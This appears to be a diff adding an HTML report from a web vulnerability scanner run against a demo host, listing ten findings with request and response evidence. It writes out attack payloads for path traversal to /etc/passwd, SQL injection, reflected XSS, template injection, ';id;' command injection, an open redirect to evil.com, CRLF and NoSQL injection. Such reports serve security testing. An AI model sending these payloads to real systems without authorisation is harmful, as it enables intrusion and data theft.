@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>WebFuzzer Report - https://demo.example.local</title>
+<style>
+  body { font-family: 'Segoe UI', Arial, sans-serif; margin: 24px; color: #222; }
+  h1 { font-size: 22px; } h2 { font-size: 16px; margin-top: 28px; }
+  table { border-collapse: collapse; width: 100%%; margin-top: 8px; }
+  th, td { border: 1px solid #ccc; padding: 6px 8px; font-size: 13px; text-align: left; vertical-align: top; }
+  th { background: #f0f0f0; }
+  .sev-critical { background: #b71c1c; color: #fff; font-weight: bold; }
+  .sev-high { background: #e53935; color: #fff; }
+  .sev-medium { background: #fb8c00; }
+  .sev-low { background: #fdd835; }
+  .sev-info { background: #bdbdbd; }
+  pre { background: #fafafa; border: 1px solid #eee; padding: 8px; font-size: 12px;
+        white-space: pre-wrap; word-break: break-all; max-height: 220px; overflow: auto; }
+  .meta { color: #555; font-size: 13px; }
+  a { color: #1565c0; }
+</style>
+</head>
+<body>
+<h1>WebFuzzer Security Report</h1>
+<p class="meta">
+  Target: <b>https://demo.example.local</b><br>
+  Started: 2026-09-25 01:08:57 &middot; Finished: 2026-09-25 01:08:57<br>
+  Requests: 312 &middot; Errors: 2 &middot; Findings: 10<br>
+  Scan ID: 1
+</p>
+<h2>Findings</h2><table><tr><th>Severity</th><th>Category</th><th>Technique</th><th>Point</th><th>URL</th><th>Status</th><th>Payload</th><th>Encoding</th><th>Evidence</th></tr><tr>
+<td><span class="sev-critical">CRITICAL</span></td>
+<td>path_traversal</td>
+<td>file-read</td>
+<td>path:filename</td>
+<td><a href="https://demo.example.local/download/../../../../etc/passwd" target="_blank">https://demo.example.local/download/../../../../etc/passwd</a></td>
+<td>200</td>
+<td>../../../../etc/passwd</td>
+<td>none</td>
+<td>file content marker: root:x:0:0:root:/root:/bin/bash</td>
+</tr>
+<pre>GET https://demo.example.local/download/../../../../etc/passwd</pre><pre>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</pre>
+<tr>
+<td><span class="sev-high">HIGH</span></td>
+<td>sqli</td>
+<td>sql-error</td>
+<td>query:user</td>
+<td><a href="https://demo.example.local/search?user=%27+OR+%271%27%3D%271" target="_blank">https://demo.example.local/search?user=%27+OR+%271%27%3D%271</a></td>
+<td>500</td>
+<td>&#x27; OR &#x27;1&#x27;=&#x27;1</td>
+<td>none</td>
+<td>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version</td>
+</tr>
+<pre>GET https://demo.example.local/search?user=%27+OR+%271%27%3D%271</pre><pre>&lt;html&gt;&lt;p&gt;Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given&lt;/p&gt;&lt;/html&gt;</pre>
+<tr>
+<td><span class="sev-high">HIGH</span></td>
+<td>sqli</td>
+<td>time-based-blind</td>
+<td>query:id</td>
+<td><a href="https://demo.example.local/item?id=1%27+AND+SLEEP%285%29--+-" target="_blank">https://demo.example.local/item?id=1%27+AND+SLEEP%285%29--+-</a></td>
+<td>200</td>
+<td>1&#x27; AND SLEEP(5)-- -</td>
+<td>url</td>
+<td>elapsed 5.2s vs baseline 0.2s</td>
+</tr>
+<pre>GET https://demo.example.local/item?id=1%27+AND+SLEEP%285%29--+-</pre><pre>&lt;html&gt;ok&lt;/html&gt;</pre>
+<tr>
+<td><span class="sev-high">HIGH</span></td>
+<td>xss</td>
+<td>xss-reflection</td>
+<td>query:q</td>
+<td><a href="https://demo.example.local/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" target="_blank">https://demo.example.local/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</a></td>
+<td>200</td>
+<td>&lt;script&gt;alert(1)&lt;/script&gt;</td>
+<td>none</td>
+<td>reflected in html context</td>
+</tr>
+<pre>GET https://demo.example.local/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</pre><pre>&lt;html&gt;&lt;body&gt;results for &lt;script&gt;alert(1)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</pre>
+<tr>
+<td><span class="sev-high">HIGH</span></td>
+<td>ssti</td>
+<td>ssti-eval</td>
+<td>query:name</td>
+<td><a href="https://demo.example.local/hello?name=%7B%7B7%2A7%7D%7D" target="_blank">https://demo.example.local/hello?name=%7B%7B7%2A7%7D%7D</a></td>
+<td>200</td>
+<td>{{7*7}}</td>
+<td>url</td>
+<td>template evaluated our expression</td>
+</tr>
+<pre>GET https://demo.example.local/hello?name=%7B%7B7%2A7%7D%7D</pre><pre>&lt;html&gt;Hello 49&lt;/html&gt;</pre>
+<tr>
+<td><span class="sev-high">HIGH</span></td>
+<td>cmdi</td>
+<td>cmd-output</td>
+<td>body_form:host</td>
+<td><a href="https://demo.example.local/ping" target="_blank">https://demo.example.local/ping</a></td>
+<td>200</td>
+<td>;id;</td>
+<td>none</td>
+<td>command output: uid=0(root) gid=0(root) groups=0(root)</td>
+</tr>
+<pre>POST https://demo.example.local/ping
+host=;id;</pre><pre>&lt;html&gt;&lt;pre&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/pre&gt;&lt;/html&gt;</pre>
+<tr>
+<td><span class="sev-medium">MEDIUM</span></td>
+<td>open_redirect</td>
+<td>open-redirect</td>
+<td>query:next</td>
+<td><a href="https://demo.example.local/login?next=//evil.com" target="_blank">https://demo.example.local/login?next=//evil.com</a></td>
+<td>302</td>
+<td>//evil.com</td>
+<td>none</td>
+<td>redirected to: //evil.com</td>
+</tr>
+<pre>GET https://demo.example.local/login?next=//evil.com</pre><pre>&lt;no body: 302 redirect&gt;</pre>
+<tr>
+<td><span class="sev-medium">MEDIUM</span></td>
+<td>crlf</td>
+<td>crlf-header</td>
+<td>query:lang</td>
+<td><a href="https://demo.example.local/set?lang=%0d%0aX-Injected:%20true" target="_blank">https://demo.example.local/set?lang=%0d%0aX-Injected:%20true</a></td>
+<td>200</td>
+<td>%0d%0aX-Injected:%20true</td>
+<td>none</td>
+<td>header X-Injected present: true</td>
+</tr>
+<pre>GET https://demo.example.local/set?lang=%0d%0aX-Injected:%20true</pre><pre>&lt;html&gt;ok&lt;/html&gt;</pre>
+<tr>
+<td><span class="sev-low">LOW</span></td>
+<td>xss</td>
+<td>xss-reflection</td>
+<td>header:Referer</td>
+<td><a href="https://demo.example.local/account" target="_blank">https://demo.example.local/account</a></td>
+<td>200</td>
+<td>&lt;svg onload=alert(1)&gt;</td>
+<td>html_entities</td>
+<td>reflected in unknown context (encoded)</td>
+</tr>
+<pre>GET https://demo.example.local/account
+Referer: &lt;svg onload=alert(1)&gt;</pre><pre>&lt;html&gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/html&gt;</pre>
+<tr>
+<td><span class="sev-info">INFO</span></td>
+<td>nosql</td>
+<td>reflection-info</td>
+<td>body_json:user</td>
+<td><a href="https://demo.example.local/api/login" target="_blank">https://demo.example.local/api/login</a></td>
+<td>200</td>
+<td>{&quot;$ne&quot;:null}</td>
+<td>none</td>
+<td>payload reflected verbatim in response</td>
+</tr>
+<pre>POST https://demo.example.local/api/login
+{&quot;user&quot;:{&quot;$ne&quot;:null}}</pre><pre>{&quot;user&quot;:{&quot;$ne&quot;:null}}</pre></table>
+</body>
+</html>
